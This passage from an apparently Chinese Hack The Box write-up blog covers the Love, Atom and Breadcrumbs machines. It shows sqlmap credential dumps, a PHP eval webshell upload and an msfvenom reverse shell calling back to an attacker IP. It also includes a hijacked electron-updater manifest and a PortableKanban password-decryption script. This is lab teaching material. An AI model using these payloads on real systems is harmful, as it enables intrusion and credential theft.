class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/login.php&quot;</span> -data <span class="string">&quot;voter=123&amp;password=321&amp;login=&quot;</span> --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line">[*] votesystem</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem --tables</span><br><span class="line">Database: votesystem</span><br><span class="line">[5 tables]</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">| candidates |</span><br><span class="line">| positions  |</span><br><span class="line">| voters     |</span><br><span class="line">| votes      |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[7 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| created_on | date         |</span><br><span class="line">| firstname  | varchar(50)  |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(50)  |</span><br><span class="line">| password   | varchar(60)  |</span><br><span class="line">| photo      | varchar(150) |</span><br><span class="line">| username   | varchar(50)  |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin -C username, password --dump</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10<span class="variable">$4E3VVe2PWlTMejquTmMD6</span>.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: voters</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| Column    | Type         |</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| firstname | varchar(30)  |</span><br><span class="line">| id        | int(11)      |</span><br><span class="line">| lastname  | varchar(30)  |</span><br><span class="line">| password  | varchar(60)  |</span><br><span class="line">| photo     | varchar(150) |</span><br><span class="line">| voters_id | varchar(15)  |</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters -C voters_id, password --dump</span><br><span class="line">+-----------+----------+</span><br><span class="line">| voters_id | password |</span><br><span class="line">+-----------+----------+</span><br><span class="line">+-----------+----------+</span><br></pre></td></tr></table></figure><p>然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5</p><p><s>看了眼别人WP</s><br />用443端口的功能访问本地5000得到登入凭证<br /><code>admin:@LoveIsInTheAir!!!!</code><br /><s>一直用渗透的常规思路打这台靶机, 没想到整这么一出</s><br />登入后台后上传Shel</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/voters_add.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.239</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------7586397232801671174932942436</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>696</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.10.239</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.239/admin/voters.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=uofg65u57tbm4rp6jbn0359660</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">333</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;add&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436--</span><br></pre></td></tr></table></figure><p>蚁剑上传nc反弹shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\phoebe\desktop\user.txt</span><br><span class="line">fc8833cab6af6700441328fd2a4ecc04</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><blockquote><p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br /><a href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><p>msfvenom生成一个Shell即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">a0f54f7853efdefe4c8cef97186db4c8</span><br></pre></td></tr></table></figure><blockquote><p>msfvenom &amp; nc</p></blockquote><p>本着能不用MSF就不用了MSF的原则<br />没有使用meterpreter<br />但是发现有(staged)标识还是不能用nc直接接收Shell的<br />最后用<code>windows/x64/shell/reverse_tcp</code></p><hr /><h1 id="atom"><a class="markdownIt-Anchor" href="#atom"></a> Atom</h1><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.237</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.237</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.237</span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">Software_Updates Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.237\\software_updates</span><br><span class="line"></span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  ..                                  D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client1                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client3                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 19:18:08 2021</span><br><span class="line">4413951 blocks of size 4096. 1381036 blocks available</span><br><span class="line">smb: \&gt; get UAT_Testing_Procedures.pdf</span><br><span class="line">getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure><blockquote><p>Note taking application built with electron-builder which helps users in taking important<br />notes.</p></blockquote><p><code>electron-builder</code>可以在google上搜到一个RCE漏洞</p><blockquote><p><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p></blockquote><p>构造payload</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\<span class="string">&#x27;hell.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat latest.yml</span></span><br><span class="line"><span class="string">version: 1.2.3</span></span><br><span class="line"><span class="string">path: http://10.10.16.3:9999/s&#x27;</span>hell.exe</span><br><span class="line">sha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ==</span><br></pre></td></tr></table></figure><p>开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure><p>将<code>latest.yml</code>上传至<code>client*</code>文件夹中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\jason\desktop\user.txt</span><br><span class="line">3eda0e1bce259d8ffd4c1994f84bfdea</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\&quot;program files<span class="string">&quot;\redis\redis.windows.conf</span></span><br><span class="line"><span class="string">requirepass kidvscat_yes_kidvscat</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat</span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line">1) <span class="string">&quot;pk:ids:User&quot;</span></span><br><span class="line">2) <span class="string">&quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;</span></span><br><span class="line">3) <span class="string">&quot;pk:ids:MetaDataClass&quot;</span></span><br><span class="line">4) <span class="string">&quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</span><br><span class="line"><span class="string">&quot;&#123;\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253&#125;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\jason\downloads\</span><br><span class="line"></span><br><span class="line">d-----          4/2/2021   8:21 PM                PortableKanban</span><br></pre></td></tr></table></figure><p>存在一个密码恢复的漏洞</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line"><span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure><p>得到<code>kidvscat_admin_@123</code></p><p>evil-rm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">2b36cf6bd3cd95fc37d6e2f81e80163b</span><br></pre></td></tr></table></figure><p>这提权部分实在是过于牵强了…</p><hr /><h1 id="breadcrumbs"><a class="markdownIt-Anchor" href="#breadcrumbs"></a> Breadcrumbs</h1><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.228</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.228</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORTSTATE    SERVICE   VERSION</span><br><span class="line">22/tcp   openssh  OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp   openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">135/tcp  openmsrpcMicrosoft Windows RPC</span><br><span class="line">139/tcp  opennetbios-ssn    Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  openssl/http  Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">445/tcp  openmicrosoft-ds?</span><br><span class="line">1107/tcp filtered isoipsigport-2</span><br><span class="line">3306/tcp openmysql?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowe</span></span><br><span class="line"><span class="string">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,</span><br><span class="line">SF:49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowed\x</span></span><br><span class="line"><span class="string">SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.228/</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.228/ ----</span><br><span class="line">+ http://10.10.10.228/aux (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/books/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/Books/</span><br><span class="line">+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/DB/</span><br><span class="line">+ http://10.10.10.228/examples (CODE:503|SIZE:401)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/includes/</span><br><span class="line">+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/js/</span><br><span class="line">+ http://10.10.10.228/licenses (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/PHP/</span><br><span class="line">+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/</span><br><span class="line">+ http://10.10.10.228/prn (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/server-info (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/server-status (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.10.10.228/portal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/assets/</span><br><span class="line">+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/DB/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/includes/</span><br><span class="line">+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/</span><br><span class="line"></span><br><span class="line">+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jun 12 13:42:20 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 27</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>访问路径<code>/php/books.php</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">title=a&amp;author=&amp;method=0</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">book=book7.html&amp;method=1</span><br></pre></td></tr></table></figure><p>可以看到对<code>/includes/bookController.php</code>发起的两种POST请求<br />第二种请求存在LFI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning:  file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php on line 28</span><br><span class="line">false</span><br></pre></td></tr></table></figure><p>且Apache配置上存在目录遍历漏洞, 可以配合LFI进行文件读取</p><ul><li><code>/portal/authController.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 